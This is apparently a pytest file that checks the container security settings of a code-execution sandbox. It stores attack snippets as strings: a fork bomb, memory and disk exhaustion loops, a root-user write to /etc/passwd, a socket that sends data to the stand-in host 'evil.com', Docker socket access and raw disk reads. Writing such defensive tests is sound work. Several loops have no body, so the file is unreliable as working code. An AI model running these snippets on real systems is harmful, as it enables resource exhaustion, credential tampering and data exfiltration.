"""
Adversarial test cases for sandbox security isolation.

These tests verify that the sandbox properly prevents:
- Fork bombs and process explosion
- Memory exhaustion attacks
- Filesystem escape attempts
- Network egress attempts
- Privilege escalation
- Resource limits bypass
"""

import pytest

from app.sandbox.security import get_container_security_config


class TestAdversarialIsolation:
    """Test suite for adversarial attack scenarios."""

    def test_fork_bomb_protection(self):
        """Verify fork bomb protection via PID limits."""
        config = get_container_security_config()

        # PID limit should prevent fork bombs
        assert config["pids_limit"] == 32, "PID limit should be 32 to prevent fork bombs"

        # Test code that would attempt fork bomb
        fork_bomb_code = """
import os
while True:
    os.fork()
"""
        # This code would be blocked by pids_limit=32

    def test_memory_exhaustion_protection(self):
        """Verify memory limits prevent exhaustion attacks."""
        config = get_container_security_config()

        # Memory limit should be strictly enforced
        assert config["mem_limit"] == "128m", "Memory limit should be 128MB"
        assert config["memswap_limit"] == "128m", "Swap should equal memory (no extra swap)"

        # Test code that would attempt memory exhaustion
        memory_bomb_code = """
data = []
while True:
    data.append('x' * 10**6)  # Allocate 1MB per iteration
"""
        # This would be killed by OOM killer at 128MB

    def test_cpu_exhaustion_protection(self):
        """Verify CPU limits prevent resource monopolization."""
        config = get_container_security_config()

        # CPU limit should be 0.5 cores
        assert config["nano_cpus"] == 500_000_000, "CPU should be limited to 0.5 cores"

        # Test code that would attempt CPU exhaustion
        cpu_bomb_code = """
while True:
    x = 2 ** 1000000
"""
        # This would be throttled to 0.5 CPU cores

    def test_filesystem_readonly_enforcement(self):
        """Verify filesystem is read-only except /tmp."""
        config = get_container_security_config()

        assert config["read_only"] is True, "Root filesystem should be read-only"
        assert "/tmp" in config["tmpfs"], "/tmp should be the only writable tmpfs"

        # Test code that would attempt to write to root
        filesystem_escape_code = """
with open('/etc/passwd', 'w') as f:
    f.write('hacker::0:0::/root:/bin/bash')
"""
        # This should fail with permission denied

    def test_path_traversal_blocked(self):
        """Verify path traversal attempts are contained."""
        config = get_container_security_config()

        # Read-only root prevents writes anywhere except /tmp
        assert config["read_only"] is True

        # Test various path traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "/etc/shadow",
            "../../root/.ssh/authorized_keys",
            "/proc/self/environ",
        ]

        # All write attempts should fail due to read-only filesystem
        for path in traversal_attempts:
            # These would all be blocked

    def test_network_isolation_enforcement(self):
        """Verify network access is completely disabled."""
        config = get_container_security_config()

        assert config["network_mode"] == "none", "Network should be completely disabled"

        # Test code that would attempt network egress
        network_egress_code = """
import socket
s = socket.socket()
s.connect(('evil.com', 80))
s.send(b'exfiltrate data')
"""
        # This should fail with network unreachable

    def test_capability_drop_enforcement(self):
        """Verify all Linux capabilities are dropped."""
        config = get_container_security_config()

        assert config["cap_drop"] == ["ALL"], "All capabilities should be dropped"
        assert "no-new-privileges:true" in config["security_opt"]

        # Test code that would require capabilities
        privileged_operations = [
            "import os; os.setuid(0)",  # Requires CAP_SETUID
            "import socket; s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)",  # Requires CAP_NET_RAW
            "import os; os.mount('/dev/sda1', '/mnt', 'ext4')",  # Requires CAP_SYS_ADMIN
        ]

        # All should fail due to dropped capabilities

    def test_non_root_user_enforcement(self):
        """Verify container runs as non-root user."""
        config = get_container_security_config()

        assert config["user"] == "65534:65534", "Container should run as nobody:nogroup"

        # Test code that would require root
        root_required_code = """
import os
os.setuid(0)  # Attempt to become root
with open('/etc/passwd', 'w') as f:
    f.write('malicious content')
"""
        # This should fail with permission denied

    def test_tmp_directory_isolation(self):
        """Verify /tmp is isolated and size-limited."""
        config = get_container_security_config()

        tmpfs_config = config["tmpfs"]
        assert "/tmp" in tmpfs_config

        # /tmp should have size limit to prevent disk fill
        # Default tmpfs size in Docker is 50% of RAM (64MB in our case)

        # Test code that would attempt to fill /tmp
        tmp_fill_code = """
with open('/tmp/bigfile', 'wb') as f:
    while True:
        f.write(b'x' * 10**6)  # Write 1MB at a time
"""
        # This would be limited by tmpfs size

    def test_no_docker_socket_access(self):
        """Verify Docker socket is not mounted (prevent container escape)."""
        config = get_container_security_config()

        # Ensure no volumes mount Docker socket
        # Docker socket at /var/run/docker.sock should NOT be accessible
        docker_escape_code = """
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/var/run/docker.sock')
"""
        # This should fail with file not found

    def test_device_access_blocked(self):
        """Verify device access is blocked."""
        config = get_container_security_config()

        # No devices should be accessible
        # Test code attempting device access
        device_access_code = """
with open('/dev/sda', 'rb') as f:
    f.read(512)  # Read disk MBR
"""
        # This should fail with permission denied or file not found

    def test_signal_bombing_protection(self):
        """Verify signal flood doesn't crash container."""
        config = get_container_security_config()

        # PID limit prevents spawning attack processes
        assert config["pids_limit"] == 32

        # Test code that would send signal flood
        signal_bomb_code = """
import os
import signal
while True:
    os.kill(os.getpid(), signal.SIGTERM)
"""
        # Limited by PID and resource constraints

    def test_symlink_attack_mitigation(self):
        """Verify symlink attacks are mitigated."""
        config = get_container_security_config()

        # Read-only root prevents creating malicious symlinks
        assert config["read_only"] is True

        # Test code attempting symlink attack
        symlink_attack_code = """
import os
os.symlink('/etc/shadow', '/tmp/shadow')
"""
        # Can create symlink in /tmp but can't read target due to permissions

    def test_resource_limit_summary(self):
        """Comprehensive check of all resource limits."""
        config = get_container_security_config()

        expected_limits = {
            "user": "65534:65534",  # Non-root
            "read_only": True,  # Read-only filesystem
            "network_mode": "none",  # No network
            "cap_drop": ["ALL"],  # No capabilities
            "pids_limit": 32,  # Max 32 processes
            "nano_cpus": 500_000_000,  # 0.5 CPU cores
            "mem_limit": "128m",  # 128MB RAM
            "memswap_limit": "128m",  # No swap beyond RAM
        }

        for key, expected_value in expected_limits.items():
            assert config[key] == expected_value, (
                f"Security config mismatch: {key} should be {expected_value}, "
                f"got {config.get(key)}"
            )

    def test_timeout_enforcement(self):
        """Verify execution timeout prevents infinite loops."""
        # Sandbox executor should have timeout parameter

        # Test code with infinite loop
        infinite_loop_code = """
while True:
    pass
"""
        # Should be killed after timeout (default 30 seconds)

    def test_code_size_limits(self):
        """Verify large code submissions are rejected."""
        # Should have max code size limit (e.g., 1MB)

        # Attempt to submit excessively large code
        large_code = "x = 1\n" * 1_000_000  # 1 million lines

        # Should be rejected before execution


class TestAdversarialCodePatterns:
    """Test detection of adversarial code patterns."""

    def test_detect_fork_bomb_pattern(self):
        """Test detection of fork bomb patterns."""
        patterns = [
            "os.fork()",
            "multiprocessing.Process",
            "subprocess.Popen",
        ]

        # Static analysis should detect these patterns
        for pattern in patterns:
            # Scanner should flag or warn

    def test_detect_memory_allocation_pattern(self):
        """Test detection of excessive memory allocation."""
        patterns = [
            "data.append('x' * 10**9)",  # Large string allocation
            "list(range(10**9))",  # Large list
            "bytearray(10**9)",  # Large bytearray
        ]

        # Static analysis should warn about large allocations

    def test_detect_dangerous_imports(self):
        """Test detection of dangerous module imports."""
        dangerous_imports = [
            "import socket",  # Network access
            "import subprocess",  # Command execution
            "import os",  # System calls
            "import ctypes",  # Low-level access
            "import multiprocessing",  # Process spawning
        ]

        # These should be allowed but logged/monitored


# Adversarial test execution summary
ADVERSARIAL_TEST_MATRIX = {
    "Fork Bomb": {
        "attack_vector": "Recursive process creation to exhaust PIDs",
        "mitigation": "pids_limit=32",
        "expected_behavior": "Container killed at 32 processes",
    },
    "Memory Exhaustion": {
        "attack_vector": "Allocate memory until system crashes",
        "mitigation": "mem_limit=128m, memswap_limit=128m",
        "expected_behavior": "OOM killer terminates process at 128MB",
    },
    "CPU Monopolization": {
        "attack_vector": "Infinite loop to consume 100% CPU",
        "mitigation": "nano_cpus=500_000_000 (0.5 cores)",
        "expected_behavior": "Process throttled to 50% CPU",
    },
    "Filesystem Escape": {
        "attack_vector": "Write to /etc or other system directories",
        "mitigation": "read_only=True, only /tmp writable",
        "expected_behavior": "Permission denied on write attempts",
    },
    "Network Exfiltration": {
        "attack_vector": "Connect to external host to leak data",
        "mitigation": "network_mode=none",
        "expected_behavior": "Network unreachable error",
    },
    "Privilege Escalation": {
        "attack_vector": "Attempt setuid(0) or capability abuse",
        "mitigation": "user=65534:65534, cap_drop=ALL",
        "expected_behavior": "Operation not permitted",
    },
    "Docker Escape": {
        "attack_vector": "Access Docker socket to spawn containers",
        "mitigation": "No /var/run/docker.sock mount",
        "expected_behavior": "File not found",
    },
    "Device Access": {
        "attack_vector": "Read/write raw disk devices",
        "mitigation": "No device mounts, non-root user",
        "expected_behavior": "Permission denied",
    },
}


def test_adversarial_matrix_completeness():
    """Verify all adversarial scenarios are covered."""
    assert len(ADVERSARIAL_TEST_MATRIX) >= 8, (
        f"Expected at least 8 adversarial scenarios, "
        f"got {len(ADVERSARIAL_TEST_MATRIX)}"
    )
